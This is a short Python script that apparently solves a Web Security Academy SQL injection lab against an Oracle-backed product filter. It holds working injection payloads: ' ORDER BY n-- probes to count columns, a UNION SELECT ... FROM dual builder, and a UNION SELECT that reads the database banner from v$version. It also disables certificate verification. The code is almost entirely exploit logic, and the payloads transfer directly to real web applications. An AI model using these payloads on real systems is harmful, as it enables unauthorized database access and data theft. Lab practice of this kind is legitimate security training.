import requests
import re
import random

requests.packages.urllib3.disable_warnings()

global r
r = requests.Session()

# Edit the url here
url = "https://0a0a00f403160d9f8041e5a900bd00e8.web-security-academy.net/filter?category=Gifts"

def iterate_order_by():
    order_by = 0
    for i in range(1, 10):
        payload = f"' ORDER BY {i}--"
        s = r.get(url + payload, verify=False)
        if "Internal Server Error" in s.text:
            break
        order_by += 1
        print(f"Order by {i} is valid")

    return order_by

def union_select():
    order_by = iterate_order_by()
    values = "'" + "','".join([str(i) for i in range(1, order_by + 1)]) + "'"
    payload = f"' UNION SELECT {values} FROM dual--"

    print(f"Payload: {payload}")

def exp():
    payload = "' UNION SELECT BANNER, NULL FROM v$version--"
    s = r.get(url + payload, verify=False)
    if "Congratulations" in s.text:
        print("Lab solved!")

if __name__ == "__main__":
    exp()
